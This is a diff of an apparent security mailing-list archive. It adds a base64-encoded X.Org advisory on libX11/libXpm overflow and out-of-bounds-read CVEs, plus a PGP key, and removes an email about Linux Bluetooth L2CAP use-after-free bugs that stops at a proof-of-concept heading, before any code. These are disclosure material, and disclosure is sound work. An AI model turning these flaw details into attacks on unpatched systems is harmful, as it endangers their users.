+YnVncyB3YXMgZG9uZSBpbiBsaWJYMTEgYnkgbWFraW5nDQpYUHV0SW1hZ2Uo
+KSBjbGlwIGltYWdlcyB0byB0aGUgbWF4aW11bSBYIHByb3RvY29sIHBpeG1h
+cCBzaXplIChsaW1pdGVkDQpieSB0aGUgdXNlIG9mIHVuc2lnbmVkIDE2LWJp
+dCBpbnRlZ2VycyBmb3IgaGVpZ2h0ICYgd2lkdGgpIHdoZW4gd3JpdGluZw0K
+dG8gWCBwaXhtYXBzLCBhbmQgYnkgbWFraW5nIFhDcmVhdGVQaXhtYXAoKSBn
+ZW5lcmF0ZSBYIGVycm9ycyBpZiBhDQpoZWlnaHQgb3Igd2lkdGggd2FzIHNw
+ZWNpZmllZCB0aGF0IGRpZCBub3QgZml0IGludG8gYW4gdW5zaWduZWQgMTYt
+Yml0DQppbnRlZ2VyLiAgSW4gbGliWHBtLCBoYXJkZW5pbmcgd2FzIGRvbmUg
+dG8gcmV0dXJuIGVycm9yIGNvZGVzIGZvciBhbnkNCmNhbGwgdGhhdCB3b3Vs
+ZCBoYXZlIHBhc3NlZCBvdXQtb2YtYm91bmRzIHdpZHRoIG9yIGhlaWdodCB2
+YWx1ZXMgdG8NClhDcmVhdGVQaXhtYXAoKS4NCg0KRml4Og0KaHR0cHM6Ly9n
+aXRsYWIuZnJlZWRlc2t0b3Aub3JnL3hvcmcvbGliL2xpYngxMS8tL2NvbW1p
+dC8yMDRjMzM5M2M0YzkwYTI5ZWQ2YmVmNjRlNDM4NDk1MzZlODYzYTg2DQoN
+CkhhcmRlbmluZzoNCmh0dHBzOi8vZ2l0bGFiLmZyZWVkZXNrdG9wLm9yZy94
+b3JnL2xpYi9saWJ4MTEvLS9jb21taXQvNzNhMzdkNWYyZmNhZGQ2NTQwMTU5
+YjQzMmE3MGQ4MGY0NDJkZGY0YQ0KaHR0cHM6Ly9naXRsYWIuZnJlZWRlc2t0
+b3Aub3JnL3hvcmcvbGliL2xpYngxMS8tL2NvbW1pdC9iNDAzMWZjMDIzODE2
+YWNhMDdmYmQ1OTJlZDk3MDEwYjliNDg3ODRiDQpodHRwczovL2dpdGxhYi5m
+cmVlZGVza3RvcC5vcmcveG9yZy9saWIvbGlieHBtLy0vY29tbWl0Lzg0ZmIx
+NDU3NGMwMzlmMTlhZDdmYWNlODdlYjlhY2MzMWE1MDcwMWMNCg0KMykgQ1ZF
+LTIwMjMtNDM3ODcgbGliWDExOiBpbnRlZ2VyIG92ZXJmbG93IGluIFhDcmVh
+dGVJbWFnZSgpIGxlYWRpbmcgdG8NCiAgICBhIGhlYXAgb3ZlcmZsb3cNCg0K
+SW50cm9kdWNlZCBpbjogWDExUjIgW3JlbGVhc2VkIEZlYi4gMTk4OF0NCkZp
+eGVkIGluOiBsaWJYMTEgMS44LjcNCkZvdW5kIGJ5OiBZYWlyIE1penJhaGkg
+b2YgdGhlIEpGcm9nIFZ1bG5lcmFiaWxpdHkgUmVzZWFyY2ggdGVhbQ0KRml4
+ZWQgYnk6IFlhaXIgTWl6cmFoaSBvZiB0aGUgSkZyb2cgVnVsbmVyYWJpbGl0
+eSBSZXNlYXJjaCB0ZWFtDQoNCldoZW4gY3JlYXRpbmcgYW4gaW1hZ2UsIHRo
+ZXJlIHdhcyBubyB2YWxpZGF0aW9uIHRoYXQgdGhlIG11bHRpcGxpY2F0aW9u
+DQpvZiB0aGUgY2FsbGVyLXByb3ZpZGVkIHdpZHRoIGJ5IHRoZSB2aXN1YWwn
+cyBiaXRzX3Blcl9waXhlbCBkaWQgbm90DQpvdmVyZmxvdyBhbmQgdGh1cyBy
+ZXN1bHQgaW4gdGhlIGFsbG9jYXRpb24gb2YgYSBidWZmZXIgdG9vIHNtYWxs
+IHRvIGhvbGQNCnRoZSBkYXRhIHRoYXQgd291bGQgYmUgY29waWVkIGludG8g
+aXQuICBBbiBYUE0gZmlsZSB3YXMgcHJvdmlkZWQgdGhhdA0KdHJpZ2dlcmVk
+IHRoaXMgYnVnIHdoZW4gbG9hZGVkIHZpYSBsaWJYcG0ncyBYcG1SZWFkRmls
+ZVRvUGl4bWFwKCkgZnVuY3Rpb24sDQp3aGljaCBpbiB0dXJuIGNhbGxzIFhD
+cmVhdGVJbWFnZSgpIGFuZCBoaXQgdGhpcyBidWcuDQoNCkZ1cnRoZXIgaGFy
+ZGVuaW5nIHRvIHByZXZlbnQgc2ltaWxhciBidWdzIHdhcyBkb25lIGluIGxp
+YlhwbSB0byByZXR1cm4NCmVycm9yIGNvZGVzIGZvciBhbnkgY2FsbCB0byBY
+Q3JlYXRlSW1hZ2UoKSB0aGF0IHdvdWxkIGhhdmUgcmVzdWx0ZWQgaW4NCnRo
+aXMgY2FsY3VsYXRpb24gb3ZlcmZsb3dpbmcuDQoNCkZpeDoNCmh0dHBzOi8v
+Z2l0bGFiLmZyZWVkZXNrdG9wLm9yZy94b3JnL2xpYi9saWJ4MTEvLS9jb21t
+aXQvNzkxNjg2OWQxNmJkZDExNWFjNWJlMzBhNjdjMzc0OTkwN2FlYTZhMA0K
+DQpIYXJkZW5pbmc6DQpodHRwczovL2dpdGxhYi5mcmVlZGVza3RvcC5vcmcv
+eG9yZy9saWIvbGlieHBtLy0vY29tbWl0LzkxZjg4N2I0MWJmNzU2NDhkZjcy
+NWE0ZWQzYmUwMzZkYTAyZTkxMWUNCg0KNCkgQ1ZFLTIwMjMtNDM3ODggbGli
+WHBtOiBvdXQgb2YgYm91bmRzIHJlYWQgaW4gWHBtQ3JlYXRlWHBtSW1hZ2VG
+cm9tQnVmZmVyKCkNCg0KSW50cm9kdWNlZCBpbjogdW5rbm93biAtIHByaW9y
+IHRvIHhwbS0zLjRrIFtyZWxlYXNlZCAxOTk4XQ0KRml4ZWQgaW46IGxpYlhw
+bSAzLjUuMTcNCkZvdW5kIGJ5OiBBbGFuIENvb3BlcnNtaXRoIG9mIE9yYWNs
+ZSBTb2xhcmlzIEVuZ2luZWVyaW5nDQpGaXhlZCBieTogQWxhbiBDb29wZXJz
+bWl0aCBvZiBPcmFjbGUgU29sYXJpcyBFbmdpbmVlcmluZw0KDQpXaGVuIHRo
+ZSB0ZXN0IGNhc2UgZm9yIENWRS0yMDIyLTQ2Mjg1IChmaXhlZCBpbiBsaWJY
+cG0gMy41LjE1KSB3YXMgcnVuDQp3aXRoIHRoZSBBZGRyZXNzIFNhbml0aXpl
+ciBlbmFibGVkLCBpdCBmb3VuZCBhbiBvdXQtb2YtYm91bmRzIHJlYWQgaW4N
+ClBhcnNlQ29tbWVudCgpIHdoZW4gcmVhZGluZyBmcm9tIGEgbWVtb3J5IGJ1
+ZmZlciBpbnN0ZWFkIG9mIGEgZmlsZSwgYXMNCml0IGNvbnRpbnVlZCB0byBs
+b29rIGZvciB0aGUgY2xvc2luZyBjb21tZW50IG1hcmtlciBwYXN0IHRoZSBl
+bmQgb2YgdGhlDQpidWZmZXIuDQoNCkZpeDoNCmh0dHBzOi8vZ2l0bGFiLmZy
+ZWVkZXNrdG9wLm9yZy94b3JnL2xpYi9saWJ4cG0vLS9jb21taXQvMmZhNTU0
+YjAxZWY2MDc5YTliMzVkZjkzMzJiZGM0ZjEzOWVkNjdlMA0KDQo1KSBDVkUt
+MjAyMy00Mzc4OSBsaWJYcG06IG91dCBvZiBib3VuZHMgcmVhZCBvbiBYUE0g
+d2l0aCBjb3JydXB0ZWQgY29sb3JtYXANCg0KSW50cm9kdWNlZCBpbjogdW5r
+bm93biAtIHByaW9yIHRvIHhwbS0zLjRrIFtyZWxlYXNlZCAxOTk4XQ0KRml4
+ZWQgaW46IGxpYlhwbSAzLjUuMTcNCkZvdW5kIGJ5OiBBbGFuIENvb3BlcnNt
+aXRoIG9mIE9yYWNsZSBTb2xhcmlzIEVuZ2luZWVyaW5nDQpGaXhlZCBieTog
+QWxhbiBDb29wZXJzbWl0aCBvZiBPcmFjbGUgU29sYXJpcyBFbmdpbmVlcmlu
+Zw0KDQpGdXp6aW5nIHdpdGggY2xhbmcncyAtZnNhbml0aXplL2xpYmZ1enpl
+ciBnZW5lcmF0ZWQgYW4gWFBNIGZpbGUgd2l0aCBhDQpjb3JydXB0ZWQgY29s
+b3JtYXAgc2VjdGlvbiB3aGljaCBjYXVzZWQgbGliWHBtIHRvIHJlYWQgb3V0
+IG9mIGJvdW5kcy4NCg0KRml4Og0KaHR0cHM6Ly9naXRsYWIuZnJlZWRlc2t0
+b3Aub3JnL3hvcmcvbGliL2xpYnhwbS8tL2NvbW1pdC83ZTIxY2I2M2I5YTFj
+YTc2MGEwNmNjNGNkOWIxOWJiYzNmY2Q4ZjUxDQoNCi0tLS0tLS0tLS0tLS0t
+LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
+LS0tLS0tLS0tLS0tLS0tLS0NCg0KWC5PcmcgdGhhbmtzIGFsbCBvZiB0aG9z
+ZSB3aG8gcmVwb3J0ZWQgYW5kIGZpeGVkIHRoZXNlIGlzc3VlcywgYW5kIHRo
+b3NlDQp3aG8gaGVscGVkIHdpdGggdGhlIHJldmlldyBhbmQgcmVsZWFzZSBv
+ZiB0aGlzIGFkdmlzb3J5IGFuZCB0aGVzZSBmaXhlcy4NCg0KVGhlIFguT3Jn
+IHNlY3VyaXR5IHRlYW0gd291bGQgbGlrZSB0byB0YWtlIHRoaXMgb3Bwb3J0
+dW5pdHkgdG8gcmVtaW5kIFggY2xpZW50DQphdXRob3JzIHRoYXQgY3VycmVu
+dCBiZXN0IHByYWN0aWNlcyBzdWdnZXN0IHNlcGFyYXRpbmcgY29kZSB0aGF0
+IHJlcXVpcmVzDQpwcml2aWxlZ2VzIGZyb20gdGhlIEdVSSwgdG8gcmVkdWNl
+IHRoZSByaXNrIG9mIGlzc3VlcyBsaWtlIENWRS0yMDIzLTQzNzg1Lg0KDQot
+LSANCiAgICAgIC1BbGFuIENvb3BlcnNtaXRoLSAgICAgICAgICAgICAgYWxh
+bi5jb29wZXJzbWl0aEBvcmFjbGUuY29tDQogICAgICAgIFguT3JnIFNlY3Vy
+aXR5IFJlc3BvbnNlIFRlYW0gLSB4b3JnLXNlY3VyaXR5QGxpc3RzLngub3Jn
+DQoNCg==
+
+--------------gr73DlKmyuwxihGG9VObfbD0
+Content-Type: application/pgp-keys; name="OpenPGP_0xA2FB9E081F2D130E.asc"
+Content-Disposition: attachment; filename="OpenPGP_0xA2FB9E081F2D130E.asc"
+Content-Description: OpenPGP public key
 Content-Transfer-Encoding: quoted-printable
 
-On Thu, Dec 15, 2022 at 03:23:29PM -0500, Rafael Correa De Ysasi wrote:
-> That's correct, that's part of our advisory.
+-----BEGIN PGP PUBLIC KEY BLOCK-----=0A=
+=0A=
+xsDiBEab+moRBACDH5yKqS3wcc5bdxY7PBNuwKvF5TKMfagmSvuRDtZjjIIWaA/n=0A=
+Z1KboV9Gq5g7kP7+Kfu+Qgd8u65eVsWwmPW10fXvj3aCU53glx2EdGdrHcgiyH2g=0A=
+EQfPiyBw+trIppWFRV0IDXSLMA1FNC92t2nSG/VFHaPTVwcgkIRSfcXDvwCglGdE=0A=
+a6f4uLqoNHP+m4yYnzapFuMD/R4+2AJDAvEWKDdYCGZzlawjAmmWyXrmT7/C/mx9=0A=
+8qUR473l4buXjHgDkkXXlHqdzil1vK85PhrKzNJDCCmlHUJNz+QwiAMOLwpD+kwV=0A=
+Pb57RG7y+a5JQ5+jtVw4RlUxZIk/wj2An9YBO3A5vR7PdjM32ZJCN2+aM4dYfNzQ=0A=
+xQKTA/47icvBaBVTl9rztjg2pd2Aqpc1P/GsIYLGj7XjnnJvGAENBHSH1QjpZMJG=0A=
+CTS9oJ+B0/wrIr+pA+MdFgYAb6ojMQJOO6UChjWWSGjMFcs/CeXhxlLBido3DtAE=0A=
+TbNTwO6OEfAvdosvTdhJFnwvZlJ+zZGGy5CrF2Fd9PUe9tmASc0uQWxhbiBDb29w=0A=
+ZXJzbWl0aCA8YWxhbi5jb29wZXJzbWl0aEBvcmFjbGUuY29tPsJlBBMRAgAlAhsD=0A=
+BgsJCAcDAgYVCAIJCgsEFgIDAQIeAQIXgAUCT2fPgQIZAQAKCRCi+54IHy0TDrxZ=0A=
+AJ4ucO4mWDBUEnPni/KikswECcSSQgCeM0sYiNPOo7o6I20jWb+MpeVttA3CawQT=0A=
+EQIAKwIbAwYLCQgHAwIGFQgCCQoLBBYCAwECHgECF4ACGQEFAlF50WIFCRRD2HgA=0A=
+CgkQovueCB8tEw7QWQCfSIFVTaBSD0Y07DY3EhWi857g0SYAnAv1oFd9diK8UkPD=0A=
+0QMhIKM0gfSnwoIEExEKAEICGwMGCwkIBwMCBhUIAgkKCwQWAgMBAh4BAheAAhkB=0A=
+FiEEShk8BtNefGcPpO8LovueCB8tEw4FAmRCzZ4FCScM1LQACgkQovueCB8tEw7V=0A=
+6wCdHgVUPrQGkNj9smnlELVVeE5WWjgAoImCxB5V4YvEOUy6ECZtwKQ6Np+pzStB=0A=
+bGFuIENvb3BlcnNtaXRoIDxhbGFuLmNvb3BlcnNtaXRoQHN1bi5jb20+wmsEExEK=0A=
+ACsCGwMGCwkIBwMCBhUIAgkKCwQWAgMBAh4BAheAAhkBBQJa2+OYBQkdpequAAoJ=0A=
+EKL7nggfLRMOYCwAni5vIJWdzAq0AZUjH3CEOrt/pLFmAJ9cBVZSpFHbRz3wnf2U=0A=
+tO1yilkN+MJmBBMRCgAmAhsDBgsJCAcDAgQVAggDBBYCAwECHgECF4AFAlrb454F=0A=
+CR2l6q4ACgkQovueCB8tEw4bQwCfeZS+xZY/BM3VqmKILu1fVuV5neIAoItLzd4o=0A=
+JT1TR9oBznE6XTcpdMHMwmYEExEKACYCGwMGCwkIBwMCBBUCCAMEFgIDAQIeAQIX=0A=
+gAUCWtvjngUJHaXqrgAKCRCi+54IHy0TDhtDAJ95lL7Flj8EzdWqYogu7V9W5Xmd=0A=
+4gCgi0vN3iglPVNH2gHOcTpdNyl0wczCYAQTEQIAIAUCRpv6agIbAwYLCQgHAwIE=0A=
+FQIIAwQWAgMBAh4BAheAAAoJEKL7nggfLRMO9pkAn28Qz0g8P9gddIv0X4KShP2l=0A=
+fwgXAKCNDnG1x5eRtMZVl06JxnbbaZX0ycJmBBMRAgAmAhsDBgsJCAcDAgQVAggD=0A=
+BBYCAwECHgECF4AFAlF50WIFCRRD2HgACgkQovueCB8tEw7qxQCfSOXeH2tjg4nX=0A=
+cu7uewpyXKEOk6oAoIWBOZoMZG4NHGWguD2N+2uftru+wmsEExEKACsCGwMGCwkI=0A=
+BwMCBhUIAgkKCwQWAgMBAh4BAheAAhkBBQJa2+OYBQkdpequAAoJEKL7nggfLRMO=0A=
+YCwAni5vIJWdzAq0AZUjH3CEOrt/pLFmAJ9cBVZSpFHbRz3wnf2UtO1yilkN+MJ9=0A=
+BBMRCgA9AhsDBgsJCAcDAgQVAggDBBYCAwECHgECF4AWIQRKGTwG0158Zw+k7wui=0A=
++54IHy0TDgUCZELNngUJJwzUtAAKCRCi+54IHy0TDunHAKCKZyiF/IwgoqYQr4Sj=0A=
+puMD64swlgCfdkI2v8kaaFwSrEp3AeYvcT2psPTNKEFsYW4gQ29vcGVyc21pdGgg=0A=
+PGFsYW5jQGZyZWVkZXNrdG9wLm9yZz7CaAQTEQoAKAIbAwYLCQgHAwIGFQgCCQoL=0A=
+BBYCAwECHgECF4AFAlrb454FCR2l6q4ACgkQovueCB8tEw6whACdFj9U5SQuhv0e=0A=
+8BQvI4orGPzUMSkAoImqdVB7sU7Z++djBrj3uJc4m0F6wmIEExECACIFAk9nzt4C=0A=
+GwMGCwkIBwMCBhUIAgkKCwQWAgMBAh4BAheAAAoJEKL7nggfLRMOZgYAnRMF9y8X=0A=
+wVMnsrTRBRZvVb/oFyhoAJ9RayEpD+vnrkoMIBr4qmpgH1bjOsJoBBMRAgAoAhsD=0A=
+BgsJCAcDAgYVCAIJCgsEFgIDAQIeAQIXgAUCUXnRYgUJFEPYeAAKCRCi+54IHy0T=0A=
+DonxAKCPcAgXNojuujUg5Wqi6v0RBFVSUgCggq1SsVEdq9NDWvXvkeGyNaBivSLC=0A=
+fwQTEQoAPwIbAwYLCQgHAwIGFQgCCQoLBBYCAwECHgECF4AWIQRKGTwG0158Zw+k=0A=
+7wui+54IHy0TDgUCZELNngUJJwzUtAAKCRCi+54IHy0TDlIAAKCMjV7lOZDqLaWa=0A=
+yrz640AE27DwpQCfcJIf59yAKG1emgy29ajreUU9z6fOwU0ERpv6bxAIAJp5aUlh=0A=
+o5rUhpS6ik7spsAQFPRuycPKMNu0J4F0v/OoPz085soV8ytLj4HqCGk2Zamh1jSg=0A=
+liZwuk9m7V7Wgxx+nBJawpWDX/eKLObErfDwQ4dfOFvjbXLQMmNnQNaUGIWLPP3l=0A=
+8GuBOHMq60Bu+TPgh627vUntL5REQEQqTXIzWC6U10QsDblLwIvdOVSdGF5xl/N1=0A=
+myXzSKvrsZwWtoFc8G9v9hcCjhtN1sm9b7Ojc51iZXvcetcvPy5RA6AUW3yEExae=0A=
+dUdLnvIF9sjFYIfJWFVYh2AgavnGre6fF+NV2v3zfx3wRT7H9//m4YIDYJmgZgyQ=0A=
+ccXegTwfGBIq3osAAwYH/1FiMUMMES5Ilz2nDqId+DCWECAU6wgvIFRcXrZWxDxB=0A=
++ZrnmTCXoAD0xedpfOkRHp8XTVc/9MU+wQ+lZRx2OQ6MJW0XGuFvHm94KZF/8HzW=0A=
+A2Ah7U4n0+3sLpk6zWceZq2zZNF0yVTjwD98+xNK1Q9sP8aOKdtg8yMH3hisKR6r=0A=
+dW+mfX5q0Q8Gol2hZsFH/qyIhnPzhXDknuOh8E5iMkzrejVXUEn++Yzj23XjP59S=0A=
+ObLznVkyxI+kBI9qvVEPfFBDybjHWqLcgRcCpXAzjizEi+/d31iDa2ErJHV4R42o=0A=
+becFqiPnoDtiX3IiP7z9fmxM4aWPZZRqvq+1ht5wkn/CSQQYEQIACQUCRpv6bwIb=0A=
+DAAKCRCi+54IHy0TDoLoAKCHYRpw/XfyEunw1YL/uMZzl78qIQCdFVcXNbqD83qV=0A=
+hW4Ly7hyDL8o0aLCwa4EGBEKAA8CGwIFAlrb470FCRLIEBwCKcFdIAQZAQoABgUC=0A=
+UXnVIQAKCRDP3xSIKMZCp9bmD/9050ke3bdx0zLPlUANoTu74vQT55f0a0cXgnrj=0A=
+15ey6Ln0S1seHadd0aF3lKpDwUOL0YIQppDhLfWf9gEsQEKSPtHQgyKRbajvz8nE=0A=
+Oi8Hz5ovrTqGCZp81XHVoiyEiCWuXxeW7eyN4C8bjxbpiN0vaZ+sgMeMhXA5mwyK=0A=
+Fs4m9JPpDe6kd2eaMO0zkcJCYjk0RcNZiPohm6EmeesNbA2zJhXgo+hQHEByojIJ=0A=
+5ltWyy5Zacc9dfxVq9Wr3y+lXKd8bMZiklsOPX0L+60yMoYjl1y9tVq5wDtf+iS3=0A=
+GvFLpIEOG4hoAT3hkeVvGp/Id8RMj8trZn8AsMC1h2ElHaBKRMfIpJbVCpiW6VJ8=0A=
+H/+WedrjiaZO5E41sM2BvQUZK+2wExnzSIcOo+BR9LrSTEJ8WuxIZ9MVT5fhADOl=0A=
+O1QkRyv4ngdQsN4x/A6CCFV+YrEVdZ+53zENoJe7LAtO1WAwJmng/swDK4mVrGwV=0A=
+O75zVWXL3iCuThQy0AssyoJdKiwDj3SAtNJ2DcdLDG3ZD8sl3Ljbtkgy+MZciu6e=0A=
+zxT86Yv11WBa7dskewvrxKTHxOzrepM31Bcz88H7xXA5oLs8n6Dq3jQOV46Z2xLx=0A=
+w3fXJ/koHyuwvi6fi7XKswl+mdJuU8y7nAmLeSOgD4N3lkWrH2dOLjAGN9VgYI+y=0A=
+V6rn0gkQovueCB8tEw7nxACeNnR9mrdd+VMF32hm6lu54QUhWiQAoJLzrvm3uK/H=0A=
+XyfDrNoGAjiyAj+3zsFNBFF51SEBEACh6YzpmNOep9LbGaFvauXoLDHJebSgvLop=0A=
+q4TtOZ56vuf+tP2HnQvvlfXPW/9/1+ztvC8gZALQYA9MSWUg0NA4U8ygKegM40LQ=0A=
+byOvLopxsMUo0/qEKTzMaoQNSNJM6BAwnRKlfh7FTgBHWwIv7T/W23Uw88FXPDFg=0A=
+64mpgVKnOd0W9NDH38veN+VIE0uIAITMADYcul2ZjjAYSEzs8RSVBA0wybS2xNG9=0A=
+Yz0UEuzR0IGpNYp5rrzzHN8ALqBHEgkrdcbqW2LAaFzoyucAv3hNSyHWaEcltjpE=0A=
+9eNA6g2fM30SA/OtIZ4q52IG9PUzzbY/d6bnVAFLek/frXCzeP68YcRzsLHuuihh=0A=
+zuG0Na2epn3KOkmHfVetHC+oQtnjHnMsWZYjLte5Y+xF/JcVB/qJiIB3OxxqMlEe=0A=
+lflgetHMVo+b9Oc3Xi3mdmiwXDxYcZXwxEpvH+Hs3SUg0tUGZgtD+Yd0SX4YX5nQ=0A=
+a/JB86+9ddQ9fzu9QL9VVeRcifWMVEsaeCD7syuyW24FR3AOj716w81lLJZmYDwA=0A=
+6Sh+IU5hvzXQqoRF3Ln72OrOcjZLAfF90Xjb7kksnxp0c95L7citF8wuykV9j6ri=0A=
+yOgPCiaax8GRqhAdTQxvG9ommJ4ITo8nyGBFUBd5xn2gcL+JawjxKGUlGivH/zUG=0A=
+YzVPDUMk5wARAQABwsGuBBgRCgAPAhsCBQJa2+O9BQkSyBAcAinBXSAEGQEKAAYF=0A=
+AlF51SEACgkQz98UiCjGQqfW5g//dOdJHt23cdMyz5VADaE7u+L0E+eX9GtHF4J6=0A=
+49eXsui59EtbHh2nXdGhd5SqQ8FDi9GCEKaQ4S31n/YBLEBCkj7R0IMikW2o78/J=0A=
+xDovB8+aL606hgmafNVx1aIshIglrl8Xlu3sjeAvG48W6YjdL2mfrIDHjIVwOZsM=0A=
+ihbOJvST6Q3upHdnmjDtM5HCQmI5NEXDWYj6IZuhJnnrDWwNsyYV4KPoUBxAcqIy=0A=
+CeZbVssuWWnHPXX8VavVq98vpVynfGzGYpJbDj19C/utMjKGI5dcvbVaucA7X/ok=0A=
+txrxS6SBDhuIaAE94ZHlbxqfyHfETI/La2Z/ALDAtYdhJR2gSkTHyKSW1QqYlulS=0A=
+fB//lnna44mmTuRONbDNgb0FGSvtsBMZ80iHDqPgUfS60kxCfFrsSGfTFU+X4QAz=0A=
+pTtUJEcr+J4HULDeMfwOgghVfmKxFXWfud8xDaCXuywLTtVgMCZp4P7MAyuJlaxs=0A=
+FTu+c1Vly94grk4UMtALLMqCXSosA490gLTSdg3HSwxt2Q/LJdy427ZIMvjGXIru=0A=
+ns8U/OmL9dVgWu3bJHsL68Skx8Ts63qTN9QXM/PB+8VwOaC7PJ+g6t40DleOmdsS=0A=
+8cN31yf5KB8rsL4un4u1yrMJfpnSblPMu5wJi3kjoA+Dd5ZFqx9nTi4wBjfVYGCP=0A=
+sleq59IJEKL7nggfLRMO58QAnjZ0fZq3XflTBd9oZupbueEFIVokAKCS8675t7iv=0A=
+x18nw6zaBgI4sgI/t8LBrgQYEQoADwUCUXnVIQIbAgUJCWYBgAIpCRCi+54IHy0T=0A=
+DsFdIAQZAQoABgUCUXnVIQAKCRDP3xSIKMZCp9bmD/9050ke3bdx0zLPlUANoTu7=0A=
+4vQT55f0a0cXgnrj15ey6Ln0S1seHadd0aF3lKpDwUOL0YIQppDhLfWf9gEsQEKS=0A=
+PtHQgyKRbajvz8nEOi8Hz5ovrTqGCZp81XHVoiyEiCWuXxeW7eyN4C8bjxbpiN0v=0A=
+aZ+sgMeMhXA5mwyKFs4m9JPpDe6kd2eaMO0zkcJCYjk0RcNZiPohm6EmeesNbA2z=0A=
+JhXgo+hQHEByojIJ5ltWyy5Zacc9dfxVq9Wr3y+lXKd8bMZiklsOPX0L+60yMoYj=0A=
+l1y9tVq5wDtf+iS3GvFLpIEOG4hoAT3hkeVvGp/Id8RMj8trZn8AsMC1h2ElHaBK=0A=
+RMfIpJbVCpiW6VJ8H/+WedrjiaZO5E41sM2BvQUZK+2wExnzSIcOo+BR9LrSTEJ8=0A=
+WuxIZ9MVT5fhADOlO1QkRyv4ngdQsN4x/A6CCFV+YrEVdZ+53zENoJe7LAtO1WAw=0A=
+Jmng/swDK4mVrGwVO75zVWXL3iCuThQy0AssyoJdKiwDj3SAtNJ2DcdLDG3ZD8sl=0A=
+3Ljbtkgy+MZciu6ezxT86Yv11WBa7dskewvrxKTHxOzrepM31Bcz88H7xXA5oLs8=0A=
+n6Dq3jQOV46Z2xLxw3fXJ/koHyuwvi6fi7XKswl+mdJuU8y7nAmLeSOgD4N3lkWr=0A=
+H2dOLjAGN9VgYI+yV6rn0ryRAKCQbM+fmYHJdiIJEKRMVERryBqBmwCdFva+yZXD=0A=
+OW4qv6rNje1X/ghKjH/Cwa0EGBEKAA8FAlF51SECGwIFCQlmAYACKQkQovueCB8t=0A=
+Ew7BXSAEGQEKAAYFAlF51SEACgkQz98UiCjGQqfW5g//dOdJHt23cdMyz5VADaE7=0A=
+u+L0E+eX9GtHF4J649eXsui59EtbHh2nXdGhd5SqQ8FDi9GCEKaQ4S31n/YBLEBC=0A=
+kj7R0IMikW2o78/JxDovB8+aL606hgmafNVx1aIshIglrl8Xlu3sjeAvG48W6Yjd=0A=
+L2mfrIDHjIVwOZsMihbOJvST6Q3upHdnmjDtM5HCQmI5NEXDWYj6IZuhJnnrDWwN=0A=
+syYV4KPoUBxAcqIyCeZbVssuWWnHPXX8VavVq98vpVynfGzGYpJbDj19C/utMjKG=0A=
+I5dcvbVaucA7X/oktxrxS6SBDhuIaAE94ZHlbxqfyHfETI/La2Z/ALDAtYdhJR2g=0A=
+SkTHyKSW1QqYlulSfB//lnna44mmTuRONbDNgb0FGSvtsBMZ80iHDqPgUfS60kxC=0A=
+fFrsSGfTFU+X4QAzpTtUJEcr+J4HULDeMfwOgghVfmKxFXWfud8xDaCXuywLTtVg=0A=
+MCZp4P7MAyuJlaxsFTu+c1Vly94grk4UMtALLMqCXSosA490gLTSdg3HSwxt2Q/L=0A=
+Jdy427ZIMvjGXIruns8U/OmL9dVgWu3bJHsL68Skx8Ts63qTN9QXM/PB+8VwOaC7=0A=
+PJ+g6t40DleOmdsS8cN31yf5KB8rsL4un4u1yrMJfpnSblPMu5wJi3kjoA+Dd5ZF=0A=
+qx9nTi4wBjfVYGCPsleq59K8kQCYx1CnlZcq630ITy9dB/aHCQry2gCbBwZ2Rsf9=0A=
+kr05S8uLhlwW3vRSvRvCwcUEGBEKACYCGwIWIQRKGTwG0158Zw+k7wui+54IHy0T=0A=
+DgUCZELNigUJHC756QIpwV0gBBkBCgAGBQJRedUhAAoJEM/fFIgoxkKn1uYP/3Tn=0A=
+SR7dt3HTMs+VQA2hO7vi9BPnl/RrRxeCeuPXl7LoufRLWx4dp13RoXeUqkPBQ4vR=0A=
+ghCmkOEt9Z/2ASxAQpI+0dCDIpFtqO/PycQ6LwfPmi+tOoYJmnzVcdWiLISIJa5f=0A=
+F5bt7I3gLxuPFumI3S9pn6yAx4yFcDmbDIoWzib0k+kN7qR3Z5ow7TORwkJiOTRF=0A=
+w1mI+iGboSZ56w1sDbMmFeCj6FAcQHKiMgnmW1bLLllpxz11/FWr1avfL6Vcp3xs=0A=
+xmKSWw49fQv7rTIyhiOXXL21WrnAO1/6JLca8UukgQ4biGgBPeGR5W8an8h3xEyP=0A=
+y2tmfwCwwLWHYSUdoEpEx8ikltUKmJbpUnwf/5Z52uOJpk7kTjWwzYG9BRkr7bAT=0A=
+GfNIhw6j4FH0utJMQnxa7Ehn0xVPl+EAM6U7VCRHK/ieB1Cw3jH8DoIIVX5isRV1=0A=
+n7nfMQ2gl7ssC07VYDAmaeD+zAMriZWsbBU7vnNVZcveIK5OFDLQCyzKgl0qLAOP=0A=
+dIC00nYNx0sMbdkPyyXcuNu2SDL4xlyK7p7PFPzpi/XVYFrt2yR7C+vEpMfE7Ot6=0A=
+kzfUFzPzwfvFcDmguzyfoOreNA5XjpnbEvHDd9cn+SgfK7C+Lp+LtcqzCX6Z0m5T=0A=
+zLucCYt5I6APg3eWRasfZ04uMAY31WBgj7JXqufSCRCi+54IHy0TDiRsAJ97uVS+=0A=
+ZHPJ6P8o4rac77WTtYgYZgCfdka/GHv4Mk1MfL/MFS41nSdZZvw=3D=0A=
+=3Dd197=0A=
+-----END PGP PUBLIC KEY BLOCK-----=0A=
 
-Please include CVEs in reports to oss-security when they are assigned.
+--------------gr73DlKmyuwxihGG9VObfbD0--
 
-> Thanks,
->=20
-> Rafael
->=20
-> On Wed, Dec 14, 2022 at 4:06 PM Salvatore Bonaccorso <carnil@debian.org>
-> wrote:
->=20
-> > Hi,
-> >
-> > On Wed, Dec 14, 2022 at 01:13:21PM -0500, Rafael Correa De Ysasi wrote:
-> > > Summary
-> > >
-> > > There are use-after-free vulnerabilities in the Linux kernel's
-> > > net/bluetooth/l2cap_core.c's l2cap_connect and l2cap_le_connect_req
-> > functions
-> > > which may allow code execution and leaking kernel memory (respectivel=
-y)
-> > > remotely via Bluetooth.
-> > >
-> > > The l2cap_le_connect_req bug was introduced in commit 27e2d4c
-> > > <
-> > https://github.com/torvalds/linux/commit/27e2d4c8d28be1d1b4ecfbffab572d=
-7dbd35254d
-> > >
-> > > (version:
-> > > 3.12.0, date: 2013-Dec-05), the SMP channel is available since commit
-> > > 70db83c
-> > > <
-> > https://github.com/torvalds/linux/commit/70db83c4bcdc1447bbcb318389561c=
-90d7056b18
-> > >
-> > > (version:
-> > > 3.16.0, date: 2014-Aug-14).
-> > > Severity
-> > >
-> > > Moderate
-> > > Proof of Concept
-> > >
-> > > *UAF read in l2cap_le_connect_req*
-> > >
-> > > *```*
-> > >
